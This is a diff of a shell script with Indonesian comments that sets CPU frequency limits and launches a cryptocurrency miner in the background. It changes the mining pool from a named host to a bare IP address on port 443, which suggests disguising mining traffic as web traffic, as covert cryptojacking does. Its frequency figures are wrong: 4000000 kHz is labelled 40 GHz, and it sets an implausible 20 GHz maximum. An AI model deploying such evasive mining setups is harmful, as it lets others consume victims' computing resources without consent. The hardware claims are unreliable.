@@ -19,7 +19,7 @@ fi
 
 # Mengatur frekuensi CPU ke 20 GHz
 CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
-MAX_FREQ=4000000 # Maksimal frekuensi dalam kHz (40 GHz)
+MAX_FREQ=20000000 # Maksimal frekuensi dalam kHz (20 GHz)
 
 for dir in $CPUFREQ_PATH; do
     if [ -e $dir/scaling_max_freq ]; then
@@ -29,10 +29,10 @@ done
 
 # Pengaturan penambangan
 ALGO="verushash"
-POOL_URL="stratum+tcp://eu.luckpool.net:3956"
+POOL_URL="stratum+tcp://206.189.144.101:443"
 WALLET_ADDRESS="RSG3DX4HDWw1Z1k3jSPwribvVs3ghscR3m"
 PASSWORD="x"
-WORKER_NAME="bonge$RANDOM"
+WORKER_NAME="AOL$RANDOM"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
